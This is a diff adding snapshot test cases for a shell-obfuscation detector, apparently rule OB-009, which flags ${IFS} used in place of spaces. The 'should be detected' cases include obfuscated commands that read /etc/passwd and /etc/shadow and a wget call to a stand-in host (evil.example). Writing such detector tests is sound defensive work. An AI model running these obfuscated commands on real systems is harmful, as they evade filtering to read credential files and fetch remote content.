@@ -1,0 +1,17 @@
+# OB-009: IFS whitespace obfuscation
+# Test cases for snapshot testing
+# Detects ${IFS}/$IFS used to replace spaces in commands, evading
+# whitespace-based filtering and detection (MITRE T1027).
+
+# === Cases that SHOULD be detected ===
+cat${IFS}/etc/passwd
+wget${IFS}-qO-${IFS}http://evil.example
+cat$IFS/etc/shadow
+X=${IFS%??};echo$X
+uploads${IFS}file
+
+# === Cases that should NOT be detected (benign) ===
+IFS=$'\n' read -r line
+while IFS= read -r line; do echo "$line"; done
+echo "$IFS" | xxd
+OLD_IFS=$IFS
